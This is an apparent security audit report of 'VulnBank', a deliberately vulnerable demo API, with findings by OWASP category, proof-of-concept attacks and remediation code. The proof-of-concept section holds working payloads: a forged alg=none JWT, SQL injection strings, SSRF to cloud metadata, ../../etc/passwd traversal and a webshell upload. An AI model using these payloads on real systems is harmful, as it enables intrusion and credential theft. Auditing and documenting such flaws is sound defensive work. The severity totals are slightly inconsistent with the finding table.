# Security Audit Report — VulnBank API

**Date:** 2026-06-06
**Auditor:** r0ms3c + Claude Code
**Branch:** `main`
**Overall Risk Rating:** CRITICAL

---

## Scope

| | |
|---|---|
| **In scope** | `app/main.py`, `app/auth.py`, `app/db.py`, `app/admin.py`, `app/files.py`, `app/requirements.txt` |
| **Out of scope** | `.claude/` (security framework, not runtime code), `.github/workflows/` (CI config) |
| **Applicable classes** | All OWASP Top 10 2021; A04/A09 have minimal surface area given the stack |

---

## Automated Scan Summary

`bandit`, `semgrep`, `pip-audit`, and `safety` were not available in this environment. CVEs are taken from inline comments in `requirements.txt`. All findings below are from manual source review.

---

## Manual Review by OWASP Category

### A01 — Broken Access Control
🔴 **Confirmed — Multiple critical instances**

- `admin.py:28` — IDOR: no ownership check on `GET /admin/user/{user_id}`; any user retrieves any user's password hash
- `admin.py:73` — Mass assignment: users can set their own `role` to `admin` via `PUT /admin/user/{id}`
- `admin.py:119` — Broken function-level auth: `GET /admin/debug/tokens` requires zero authentication and returns valid signed JWTs for every user
- `db.py:131` — No ownership check on fund transfer: any user drains any account
- `files.py:34` — Path traversal on download: `../../etc/passwd` style attacks
- `files.py:60` — Path traversal on upload: attacker-controlled filename written directly to filesystem
- `files.py:92` — Directory listing: all users see all uploaded files from all other users
- `files.py:113` — No ownership check on delete: any user deletes any file

### A02 — Cryptographic Failures
🔴 **Confirmed — Pervasive**

- `auth.py:22` — JWT secret is literally `"secret"` — trivially brute-forceable
- `auth.py:28-43` — Passwords hashed with unsalted MD5; rainbow tables instantly crack these
- `main.py:35-37` — Three hardcoded secrets: `SECRET_KEY`, `DB_PASSWORD`, `INTERNAL_API_KEY`
- `db.py:24-28` — DB credentials hardcoded in source
- `admin.py:99` — Hardcoded `ADMIN_KEY` in source control
- `main.py:65` — `DB_PASSWORD` actively returned in every HTTP 500 response body

### A03 — Injection
🔴 **Confirmed — Every database query is vulnerable**

- `db.py:87` — f-string SQL injection in `/data/account`
- `db.py:113` — f-string SQL injection in `/data/search` LIKE clause
- `db.py:138-151` — Three separate f-string injections in `/data/transfer` (from_account, to_account, note)
- `files.py:60-84` — Unrestricted file upload: no extension allowlist, no size cap, no content validation; enables webshell upload

### A05 — Security Misconfiguration
🔴 **Confirmed**

- `main.py:43` — `debug=True` passed to FastAPI, enables verbose tracebacks
- `main.py:55-67` — Global 500 handler returns full Python traceback, `os.getcwd()`, and `DB_PASSWORD`
- `main.py:93-101` — `/health` returns `SECRET_KEY` and `dict(os.environ)` (dumps all env vars to any caller)
- `db.py:93-95`, `db.py:117` — Raw SQL query string returned in HTTP error bodies
- `main.py:112` — Server binds to `0.0.0.0`

### A06 — Vulnerable and Outdated Components
🔴 **Confirmed — Intentionally pinned to CVE-bearing versions**

- `PyJWT==1.7.1` — CVE-2022-29217: accepts `alg=none`
- `requests==2.18.0` — CVE-2018-18074: credentials forwarded on redirect
- `Pillow==8.3.1` — CVE-2021-34552: buffer overflow in image processing
- `cryptography==2.1.4` — Multiple CVEs including padding oracle attacks

### A07 — Auth and Session Failures
🔴 **Confirmed**

- `auth.py:71` — Rate limiting code is dead: threshold `> 1000` and body is `pass`; unlimited brute force
- `auth.py:87-91` — Tokens have no `exp` claim; issued tokens are valid forever
- `auth.py:74-77` — Timing attack: non-existent usernames return immediately vs. valid usernames triggering MD5 comparison
- `auth.py:126-141` — Password reset token is predictable: `MD5(username + floor(unix_ts/60))`; algorithm hint returned in API response
- `auth.py:137` — Reset token returned directly in response body
- `auth.py:149-164` — No password complexity requirements on reset

### A08 — Software and Data Integrity Failures
🔴 **Confirmed**

- `auth.py:110-114` — `jwt.decode(..., algorithms=None)` accepts any algorithm the token header specifies, including `"none"`, bypassing signature verification entirely
- `auth.py:114` — `options={"verify_exp": False}` disables expiry validation unconditionally

### A09 — Logging and Monitoring Failures
⚠️ **Potential** — No access logging, no failed-login alerting, no audit trail on sensitive operations (fund transfers, user deletion, admin panel access)

### A10 — SSRF
🔴 **Confirmed**

- `main.py:75-87` — `GET /fetch?url=<attacker-controlled>` passes URL directly to `requests.get()` with no validation, allowlist, or private-IP filtering

---

## Finding Table

| # | Severity | OWASP | CWE | File | Line | Title |
|---|---|---|---|---|---|---|
| 1 | CRITICAL | A08 | CWE-345 | auth.py | 110–114 | JWT `none` Algorithm — Full Auth Bypass |
| 2 | CRITICAL | A01 | CWE-306 | admin.py | 119–131 | Unauthenticated Debug Token Generator |
| 3 | CRITICAL | A03 | CWE-89 | db.py | 87 | SQL Injection — `/data/account` |
| 4 | CRITICAL | A03 | CWE-89 | db.py | 113 | SQL Injection — `/data/search` |
| 5 | CRITICAL | A03 | CWE-89 | db.py | 138–151 | SQL Injection — `/data/transfer` (3 injection points) |
| 6 | CRITICAL | A10 | CWE-918 | main.py | 75–87 | SSRF — `/fetch` Endpoint |
| 7 | CRITICAL | A01 | CWE-22 | files.py | 34–49 | Path Traversal — File Download |
| 8 | CRITICAL | A05 | CWE-256 | main.py | 55–67 | DB Password Leaked in Every HTTP 500 |
| 9 | HIGH | A01 | CWE-639 | admin.py | 28–40 | IDOR — User Profile Exposes Password Hashes |
| 10 | HIGH | A01 | CWE-862 | db.py | 131–154 | Missing Authorization on Fund Transfer |
| 11 | HIGH | A01 | CWE-915 | admin.py | 73–91 | Mass Assignment — Self-Escalation to Admin |
| 12 | HIGH | A02 | CWE-916 | auth.py | 28–43 | Passwords Stored as Unsalted MD5 |
| 13 | HIGH | A05 | CWE-215 | main.py | 93–101 | `/health` Dumps `SECRET_KEY` + All Env Vars |
| 14 | HIGH | A07 | CWE-307 | auth.py | 62–93 | No Rate Limiting — Unlimited Brute Force |
| 15 | HIGH | A07 | CWE-613 | auth.py | 87–91 | JWT Tokens Never Expire |
| 16 | HIGH | A08 | CWE-347 | auth.py | 114 | JWT Expiry Check Disabled |
| 17 | HIGH | A03 | CWE-434 | files.py | 60–84 | Unrestricted File Upload |
| 18 | HIGH | A06 | CWE-1035 | requirements.txt | 7 | PyJWT 1.7.1 — CVE-2022-29217 |
| 19 | HIGH | A06 | CWE-1035 | requirements.txt | 10 | cryptography 2.1.4 — Multiple CVEs |
| 20 | MEDIUM | A01 | CWE-22 | files.py | 60–84 | Path Traversal — File Upload Filename |
| 21 | MEDIUM | A01 | CWE-862 | files.py | 113–120 | No Authorization on File Delete |
| 22 | MEDIUM | A02 | CWE-798 | main.py | 35–37 | Hardcoded Secrets in Source Code |
| 23 | MEDIUM | A02 | CWE-798 | auth.py | 22 | Hardcoded JWT Secret `"secret"` |
| 24 | MEDIUM | A02 | CWE-798 | admin.py | 99 | Hardcoded Admin Key in Source |
| 25 | MEDIUM | A07 | CWE-204 | auth.py | 74–77 | Username Enumeration via Timing Attack |
| 26 | MEDIUM | A07 | CWE-640 | auth.py | 126–141 | Predictable Password Reset Token |
| 27 | MEDIUM | A05 | CWE-200 | db.py | 93–95 | Raw SQL Query Returned in Error Responses |
| 28 | MEDIUM | A06 | CWE-1035 | requirements.txt | 8 | requests 2.18.0 — CVE-2018-18074 |
| 29 | MEDIUM | A06 | CWE-1035 | requirements.txt | 9 | Pillow 8.3.1 — CVE-2021-34552 |
| 30 | LOW | A01 | CWE-200 | files.py | 92–106 | Directory Listing — All Users See All Files |
| 31 | LOW | A05 | CWE-497 | files.py | 44, 81, 104 | Server File Paths Leaked in API Responses |
| 32 | LOW | A05 | CWE-1188 | main.py | 112 | Server Binds to All Interfaces (`0.0.0.0`) |
| 33 | LOW | A07 | CWE-521 | auth.py | 149–164 | No Password Complexity Requirements |
| 34 | INFO | A09 | CWE-778 | (all) | — | No Access Logging or Failed-Login Alerting |

---

## Proof of Concept

### Finding #1 — JWT `none` Algorithm (CRITICAL · A08 · CWE-345)

```
Attack:
  1. Construct a token with alg=none and an admin payload:
       header:  {"alg": "none", "typ": "JWT"}
       payload: {"sub": "attacker", "role": "admin", "id": 1}
       sig:     (empty)
  2. Base64url-encode each part and join with dots (trailing dot):
       eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiIsImlkIjoxfQ.
  3. GET /admin/panel
       Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiIsImlkIjoxfQ.

Expected result: HTTP 200, full USERS_DB with all password hashes
Impact: Complete authentication bypass — forge admin or any user identity with no credentials
```

### Finding #2 — Unauthenticated Debug Token Generator (CRITICAL · A01 · CWE-306)

```
Attack:
  GET /admin/debug/tokens
  (no headers, no authentication)

Expected result: HTTP 200, valid signed JWTs for admin, alice, and bob
Impact: Instant account takeover for every user including admin with zero credentials
```

### Finding #3 — SQL Injection `/data/account` (CRITICAL · A03 · CWE-89)

```
Attack (data dump):
  GET /data/account?owner=' UNION SELECT id,content,0,'x' FROM internal_notes--
  Authorization: Bearer <any valid token>

Expected result:
  {"id": 1, "owner": "AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE", ...}
  {"id": 2, "owner": "Admin password: P@ssw0rd!", ...}

Attack (return all accounts):
  GET /data/account?owner=' OR '1'='1

Impact: Full database exfiltration including AWS keys and admin credentials
```

### Finding #6 — SSRF `/fetch` (CRITICAL · A10 · CWE-918)

```
Attack (cloud metadata):
  GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

Attack (internal service probing):
  GET /fetch?url=http://localhost:6379
  GET /fetch?url=http://10.0.0.1/admin

Expected result: Response body from internal/metadata service returned verbatim
Impact: AWS IAM credential theft, internal network discovery, potential RCE via internal APIs
```

### Finding #7 — Path Traversal File Download (CRITICAL · A01 · CWE-22)

```
Attack:
  GET /files/download?filename=../../app/auth.py
  Authorization: Bearer <any valid token>

  GET /files/download?filename=../../etc/passwd

Expected result: Full source code of auth.py (or /etc/passwd) returned as file download
Impact: Source disclosure of all secrets and logic; arbitrary file read from server filesystem
```

### Finding #11 — Mass Assignment Privilege Escalation (HIGH · A01 · CWE-915)

```
Attack:
  PUT /admin/user/2
  Authorization: Bearer <alice's token>
  Content-Type: application/json
  {"role": "admin"}

Expected result: {"message": "User alice updated", "new_data": {"role": "admin", ...}}
Impact: Any authenticated user self-escalates to admin; gains access to /admin/panel and all password hashes
```

### Finding #17 — Unrestricted File Upload (HIGH · A03 · CWE-434)

```
Attack:
  POST /files/upload
  Authorization: Bearer <any token>
  Content-Type: multipart/form-data; boundary=X
  [file: webshell.py]
  [content: import os; result = os.popen("id").read()]

Expected result: {"path": "uploads/webshell.py", ...}
Impact: Arbitrary file write to server filesystem; if upload dir is served, enables remote code execution
```

---

## Remediation Priority

| Priority | Finding | Fix | Effort |
|---|---|---|---|
| 1 | JWT `none` algorithm (#1, #16, #18) | Set `algorithms=["HS256"]` in `jwt.decode()`; upgrade `PyJWT` to `>=2.4.0`; remove `verify_exp: False` | 15 min |
| 2 | Unauthenticated debug token endpoint (#2) | Remove `GET /admin/debug/tokens` entirely | 5 min |
| 3 | SQL Injection — all three endpoints (#3, #4, #5) | Replace every f-string query with parameterized form: `db.execute("SELECT * FROM accounts WHERE owner = ?", (owner,))` | 1 hour |
| 4 | SSRF `/fetch` (#6) | Validate URL against an allowlist; block RFC-1918 ranges (`10/8`, `172.16/12`, `192.168/16`), `169.254/16`, and `file://` | 1 hour |
| 5 | Path traversal download + upload (#7, #20) | Resolve path and assert it starts with `UPLOAD_DIR`: `safe = (Path(UPLOAD_DIR) / Path(fn).name).resolve(); assert str(safe).startswith(str(Path(UPLOAD_DIR).resolve()))` | 30 min |

---

## Remediation Snippets

### Fix: JWT Algorithm Pinning
**Before (vulnerable):**
```python
payload = jwt.decode(token, JWT_SECRET, algorithms=None, options={"verify_exp": False})
```
**After (secure):**
```python
payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
```
**Why:** `algorithms=None` lets the attacker declare `alg=none` in the token header, bypassing HMAC verification entirely. Pinning to `["HS256"]` on the server side makes the header claim irrelevant.
**CWE:** CWE-345

---

### Fix: SQL Injection
**Before (vulnerable):**
```python
query = f"SELECT * FROM accounts WHERE owner = '{owner}'"
result = db.execute(query).fetchall()
```
**After (secure):**
```python
result = db.execute("SELECT * FROM accounts WHERE owner = ?", (owner,)).fetchall()
```
**Why:** Parameterized queries send data and SQL structure separately; the database driver ensures user input is never interpreted as SQL syntax.
**CWE:** CWE-89

---

### Fix: Path Traversal
**Before (vulnerable):**
```python
file_path = os.path.join(UPLOAD_DIR, filename)
```
**After (secure):**
```python
safe_path = (Path(UPLOAD_DIR).resolve() / Path(filename).name).resolve()
if not str(safe_path).startswith(str(Path(UPLOAD_DIR).resolve())):
    raise HTTPException(status_code=400, detail="Invalid filename")
file_path = safe_path
```
**Why:** `Path.name` strips any directory components from the input; `.resolve()` then canonicalizes symlinks and `..` segments, and the prefix check ensures the result is still inside the allowed directory.
**CWE:** CWE-22

---

### Fix: SSRF
**Before (vulnerable):**
```python
response = requests.get(url, timeout=5)
```
**After (secure):**
```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_SCHEMES = {"http", "https"}
BLOCKED_RANGES = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]

parsed = urlparse(url)
if parsed.scheme not in ALLOWED_SCHEMES:
    raise HTTPException(400, "Scheme not allowed")
try:
    addr = ipaddress.ip_address(parsed.hostname)
    if any(addr in net for net in BLOCKED_RANGES):
        raise HTTPException(400, "Private addresses not allowed")
except ValueError:
    pass  # hostname, not IP — consider DNS rebinding mitigations too

response = requests.get(url, timeout=5, allow_redirects=False)
```
**Why:** Without validation, any attacker can use the server as a proxy to reach cloud metadata services, internal APIs, or arbitrary hosts. Blocking RFC-1918/169.254 ranges and non-HTTP schemes eliminates the primary attack classes.
**CWE:** CWE-918

---

### Fix: Password Hashing
**Before (vulnerable):**
```python
password_hash = hashlib.md5(password.encode()).hexdigest()
```
**After (secure):**
```python
import bcrypt
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()
# Verification:
bcrypt.checkpw(password.encode(), stored_hash.encode())
```
**Why:** MD5 is a general-purpose hash with no work factor; a GPU cracks billions per second. bcrypt includes a per-password salt and a tunable cost factor designed specifically for password storage.
**CWE:** CWE-916

---

## Summary

| Severity | Count |
|---|---|
| CRITICAL | 8 |
| HIGH | 11 |
| MEDIUM | 9 |
| LOW | 4 |
| INFO | 1 |
| **Total** | **33** |

**Overall Risk Rating: CRITICAL**

An unauthenticated attacker can, in a single HTTP request, obtain valid admin JWTs from `GET /admin/debug/tokens` — or forge one using the `alg=none` bypass — then chain SQL injection to exfiltrate the full database (including AWS credentials stored in `internal_notes`), path traversal to read arbitrary server files, and SSRF to pivot into internal infrastructure. The application has no compensating controls (rate limiting, audit logging, WAF) that would slow any of these chains.

The highest-leverage single action is pinning `algorithms=["HS256"]` in `jwt.decode()` and upgrading `PyJWT` to `>=2.4.0`, which closes three findings simultaneously. Removing the debug token endpoint takes five minutes and eliminates the easiest unauthenticated takeover path. SQL injection parameterization and path traversal fixes should follow immediately.

---

*Generated by Claude Code security-audit skill — VulnBank is a deliberately vulnerable demo application. Do not deploy in any real environment.*
